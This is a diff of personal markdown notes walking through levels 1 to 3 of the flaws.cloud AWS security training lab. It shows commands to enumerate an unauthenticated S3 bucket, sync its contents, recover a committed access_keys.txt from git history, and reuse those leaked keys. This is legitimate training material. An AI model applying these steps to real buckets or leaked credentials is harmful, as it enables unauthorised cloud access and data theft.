@@ -37,68 +37,94 @@ Use this as it contains guides for both linux and windows
 
 ### Lab
 
-flaws.cloud  [http://flaws.cloud/](http://flaws.cloud/)  
+flaws.cloud  
+[http://flaws.cloud/](http://flaws.cloud/)
 
-Level 1 (s3 bucket)  
+Level 1 (s3 bucket)
 
-Do dns lookup on flaws.cloud  
+Do dns lookup on flaws.cloud
 
-dig flaws.cloud   
+```bash
+dig flaws.cloud
+nslookup flaws.cloud
+host flaws.cloud
+````
 
-nslookup flaws.cloud  
+then
 
-host flaws.cloud  
+```bash
+dig +short -x <ip>
+```
 
-then  
+enumerate bucket with
 
-dig +short -x <ip>  
+```bash
+aws s3 ls s3://flaws.cloud/ --no-sign-request
+```
 
-enumerate bucket with  
+Level 2 (unauthorised authenticated access)
 
-aws s3 ls s3://flaws.cloud/ --no-sign-request  
+create a profile with the credentials
 
-Level 2 (unauthorised authenticated access)  
+```bash
+aws configure --profile=<yourprofile>
+```
 
-create a profile with the credentials  
+```bash
+aws s3 ls s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud --profile <yourprofile>
+```
 
-aws configure --profile=<yourprofile>  
+Level 3 (leaked credentials)
 
-aws s3  ls s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud --profile <yourprofile>  
+list bucket
 
-Level 3 (leaked credentials)  
+```bash
+aws s3 ls s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/ --profile <yourprofile>
+```
 
-list bucket  
+download bucket content
 
-aws s3  ls s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/ --profile <yourprofile>
+```bash
+aws s3 --profile <yourprofile> sync s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/ .
+```
 
-download bucket content  
+use git log  
+([https://www.javatpoint.com/git-log](https://www.javatpoint.com/git-log))  
+to review 7 history of everything that happens to a repository.
 
-aws s3 --profile <yourprofile> sync s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/ .  
+```bash
+git log
+```
 
-use git log([https://www.javatpoint.com/git-log](https://www.javatpoint.com/git-log)) to review 7 history of everything that happens to a repository.  
+find something
 
-git log  
+```bash
+git checkout f52ec03b227ea6094b04e43f475fb0126edb5a61
+```
 
-find something  
+list it
 
-git checkout f52ec03b227ea6094b04e43f475fb0126edb5a61  
+```bash
+ls -al
+```
 
-list it  
+keyssss
 
-ls -al  
+```bash
+cat access_keys.txt
+```
 
-keyssss  
+lets see what those can docs
 
-cat access_keys.txt  
+```bash
+aws configure --profile leakkeyss
+```
 
-lets see what those can docs  
+see what s3 access they have
 
-aws configure --profile leakkeyss  
-
-see what s3 access they have  
-
+```bash
 aws --profile havoc s3 ls
-
+```
 <div align="center">
 <br>
 <br>
